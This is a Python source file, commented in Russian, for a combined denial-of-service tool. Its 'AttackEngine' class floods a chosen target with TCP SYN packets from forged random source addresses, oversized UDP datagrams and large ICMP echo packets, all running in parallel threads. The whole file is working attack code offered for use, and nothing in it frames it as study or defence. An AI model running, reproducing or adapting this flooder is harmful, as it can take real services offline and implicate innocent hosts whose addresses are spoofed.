import asyncio
import socket
import struct
import random
import threading
import time

class AttackEngine:
    def __init__(self, max_threads=2000):
        self.max_threads = max_threads
        self.running = False

    # ===== SYN-флуд (основной) =====
    def syn_flood(self, target_ip, target_port, count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(count):
                if not self.running:
                    break
                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    0x45, 0, 40, 0, 0, 64, socket.IPPROTO_TCP, 0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(target_ip)
                )
                tcp_header = struct.pack('!HHLLBBHHH',
                    random.randint(1024, 65535), target_port, 0, 0, 0x02, 0, 0, 0, 0
                )
                sock.sendto(ip_header + tcp_header, (target_ip, target_port))
        except:
            pass

    # ===== UDP-флуд (для нестандартных портов) =====
    def udp_flood(self, target_ip, target_port, count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b'X' * 65500
            for _ in range(count):
                if not self.running:
                    break
                sock.sendto(payload, (target_ip, target_port))
        except:
            pass

    # ===== ICMP-флуд (добивка) =====
    def icmp_flood(self, target_ip, count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for _ in range(count):
                if not self.running:
                    break
                packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(0,65535), 0) + b'X' * 65507
                sock.sendto(packet, (target_ip, 0))
        except:
            pass

    # ===== Запуск комбинированной атаки =====
    async def single_attack(self, target, count):
        self.running = True
        target_ip, port_str = target.split(':')
        target_port = int(port_str)

        # Разбивка
        syn_c = count // 2
        udp_c = count // 4
        icmp_c = count - syn_c - udp_c

        # Потоки
        t1 = threading.Thread(target=self.syn_flood, args=(target_ip, target_port, syn_c))
        t2 = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, udp_c))
        t3 = threading.Thread(target=self.icmp_flood, args=(target_ip, icmp_c))

        t1.start()
        t2.start()
        t3.start()

        t1.join()
        t2.join()
        t3.join()

        self.running = False

    def stop(self):
        self.running = False
